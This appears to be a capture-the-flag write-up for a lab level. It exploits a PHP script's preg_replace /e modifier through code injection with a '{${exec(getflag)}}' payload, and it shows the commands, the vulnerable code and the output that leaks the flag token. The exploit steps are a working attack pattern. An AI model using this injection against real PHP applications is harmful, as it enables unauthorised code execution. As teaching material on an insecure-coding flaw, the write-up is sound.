# Level06 Solution

## Steps:
1. Connected via SSH: `ssh level06@192.168.16.128 -p 4242`
2. Found a PHP script in the home directory:
   - File: `/home/user/level06/level06.php`
   - Code:
     ```php
     #!/usr/bin/php
     <?php
     function y($m) {
         $m = preg_replace("/\./", " x ", $m);
         $m = preg_replace("/@/", " y", $m);
         return $m;
     }
     function x($y, $z) {
         $a = file_get_contents($y);
         $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
         $a = preg_replace("/\[/", "(", $a);
         $a = preg_replace("/\]/", ")", $a);
         return $a;
     }
     $r = x($argv[1], $argv[2]);
     print $r;
     ?>
     ```
3. Identified the vulnerability:
   - The `preg_replace` function uses the `/e` modifier, which allows execution of PHP code.
   - The regex `/(\[x (.*)\])/e` matches `[x ...]` and executes `y("...")` as code.
   - We can inject PHP code using complex variable syntax: `{${...}}`.
4. Created an exploit file:
   - Command: `echo '[x {${exec(getflag)}}]' > /tmp/exploit06`
5. Executed the PHP script with the exploit file:
   - Command: `./level06 /tmp/exploit06`
   - Output:
     ```
     PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
     PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub in /home/user/level06/level06.php(4) : regexp code on line 1
     ```
6. Obtained the token from the PHP notice: `wiok45aaoguiboiki2tuin6ub`

## Notes:
- The `/e` modifier in `preg_replace` is deprecated and dangerous because it allows code execution.
- The exploit uses `{${exec(getflag)}}` to execute the `getflag` command.
- The token is leaked in a PHP notice because `getflag` is not a defined constant, but it is executed as a shell command.

## Tools used:
- PHP code injection
- `echo` to create the exploit file
- Complex variable syntax `${...}` for code execution

## Vulnerability:
- Unsafe use of `preg_replace` with the `/e` modifier on user-controlled input.